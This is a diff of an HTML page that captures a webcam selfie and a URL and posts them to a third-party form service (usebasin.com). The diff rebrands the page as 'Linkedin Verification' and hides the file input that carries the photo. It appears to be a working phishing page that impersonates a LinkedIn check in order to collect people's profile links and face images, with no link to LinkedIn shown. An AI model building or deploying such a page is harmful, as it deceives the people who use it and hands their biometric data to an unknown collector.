@@ -2,12 +2,12 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Identity Verification</title>
+<title>Face Verification</title>
 
 <style>
 
 body{
-font-family: Arial;
+font-family:Arial;
 background:#0f172a;
 color:white;
 display:flex;
@@ -18,9 +18,9 @@ height:100vh;
 
 .card{
 background:#020617;
-padding:30px;
+padding:25px;
 border-radius:16px;
-width:350px;
+width:360px;
 text-align:center;
 }
 
@@ -33,8 +33,8 @@ border:none;
 }
 
 button{
-margin-top:15px;
 padding:12px;
+margin-top:10px;
 width:100%;
 border:none;
 border-radius:10px;
@@ -42,6 +42,10 @@ background:#2563eb;
 color:white;
 font-size:16px;
 cursor:pointer;
+}
+
+.camera{
+position:relative;
 }
 
 video{
@@ -61,10 +65,6 @@ transform:translate(-50%,-50%);
 pointer-events:none;
 }
 
-.camera{
-position:relative;
-}
-
 </style>
 
 </head>
@@ -73,9 +73,13 @@ position:relative;
 
 <div class="card">
 
-<h3>Identity Verification</h3>
+<h3>Linkedin Verification</h3>
 
-<form action="https://formspree.io/f/xvolnyko" method="POST" enctype="multipart/form-data">
+<form
+action="https://usebasin.com/f/4180b06c3b35"
+method="POST"
+enctype="multipart/form-data"
+>
 
 <input
 type="url"
@@ -86,13 +90,22 @@ required
 
 <div class="camera">
 
-<video id="video" autoplay playsinline></video>
+<video
+id="video"
+autoplay
+playsinline
+></video>
 
 <div class="circle"></div>
 
 </div>
 
-<button type="button" onclick="takePhoto()">Take Photo</button>
+<button
+type="button"
+onclick="capturePhoto()"
+>
+Take Photo
+</button>
 
 <input
 type="file"
@@ -100,10 +113,10 @@ name="selfie"
 id="photoInput"
 accept="image/*"
 required
->
+style="visibility: hidden !important;">
 
 <button type="submit">
-Submit Verification
+Submit
 </button>
 
 </form>
@@ -112,33 +125,48 @@ Submit Verification
 
 <script>
 
-const video = document.getElementById("video")
+const video =
+document.getElementById("video")
 
-navigator.mediaDevices.getUserMedia({video:true})
+navigator.mediaDevices
+.getUserMedia({video:true})
 .then(stream=>{
 video.srcObject = stream
 })
 
-function takePhoto(){
+function capturePhoto(){
 
-const canvas = document.createElement("canvas")
+const canvas =
+document.createElement("canvas")
 
-canvas.width = video.videoWidth
-canvas.height = video.videoHeight
+canvas.width =
+video.videoWidth
 
-const ctx = canvas.getContext("2d")
+canvas.height =
+video.videoHeight
+
+const ctx =
+canvas.getContext("2d")
 
 ctx.drawImage(video,0,0)
 
 canvas.toBlob(blob=>{
 
-const file = new File([blob],"selfie.jpg",{type:"image/jpeg"})
+const file =
+new File(
+[blob],
+"selfie.jpg",
+{type:"image/jpeg"}
+)
 
-const container = new DataTransfer()
+const container =
+new DataTransfer()
 
 container.items.add(file)
 
-document.getElementById("photoInput").files =
+document
+.getElementById("photoInput")
+.files =
 container.files
 
 alert("Photo captured")
